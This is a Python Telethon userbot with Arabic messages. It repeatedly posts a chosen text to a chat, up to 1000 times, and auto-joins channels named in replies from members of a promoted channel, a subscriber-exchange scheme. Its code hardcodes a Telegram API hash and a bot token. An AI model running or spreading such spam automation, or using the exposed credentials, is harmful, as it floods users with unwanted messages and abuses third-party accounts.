from telethon import TelegramClient
from telethon.sync import TelegramClient, events
import asyncio
import re, requests, os
from time import sleep
from telethon.tl.functions.channels import JoinChannelRequest

client = TelegramClient('dex78', 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
client.start()
i = 6134236708
@client.on(events.NewMessage(outgoing=True, pattern="tx", from_users='me'))
async def Dex1(event):
    try:
        try:
            information = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 1)
            sleeptime = information[0]
            messagess = 1000
            text = information[1]
            pace = event.chat_id
            await event.delete()
            fo = open(f'tbadel.txt', 'w')
            fo.write('on')
            fo.close()
        except:
            await event.edit(
                'طريقة تفعيل النشر خاطأ\nيرجئ تطبيق الاوامر والشرح بشكل صحيح\nلعرض الاوامر فقط اكتب ( الاوامر )')
        for _ in range(int(messagess)):
            file = open(f'tbadel.txt', 'r')
            if 'on' in file.read():
                await event.client.send_message(pace, str(text))
                file.close()
                await asyncio.sleep(int(sleeptime))
            elif 'off' in file.read():
                file.close()
                break
    except Exception as er:
        print(er)
@client.on(events.NewMessage(pattern="tstop", from_users='me'))
async def _(event):
    try:
        fi = open(f'tbadel.txt', 'w')
        fi.write('off')
        fi.close()
        await event.edit('تم توقيف النشر انتضر بقدر الوقت المضاف للنشر لعدم حدوث اخطاء في التوقيف')
    except Exception as er:
        print(er)
@client.on(events.NewMessage())
async def _9(event):
    if event.message.is_reply:
        original_message = await event.message.get_reply_message()
        if original_message.sender_id == i:
            id = event.from_id.user_id
            ch = 'rrcyi'
            url = f'https://api.telegram.org/bot6170076995:AAEiU_ATKKzWi1F-G0dxxSZR4vK443GTpGg/getchatmember?chat_id=@rrcyi&user_id={id}'
            req = requests.get(url)
            if 'member' in req.text or 'creator' in req.text or 'administartor' in req.text:
                try:
                    l2 = event.message.message
                    if "@" in l2:
                        nk = re.search(r'@\w+', l2).group()
                        await client(JoinChannelRequest(nk))
                    elif "https://t.me/" in l2:
                        nk = re.search(r'https://t.me/\w+', l2).group()
                        await client(JoinChannelRequest(nk))
                    else:pass
                    sleep(3)
                    await event.reply('تم @rrcyi')
                except:pass
            else:
                sleep(4)
                await event.reply('تبادل ، انضم @rrcyi')



client.run_until_disconnected()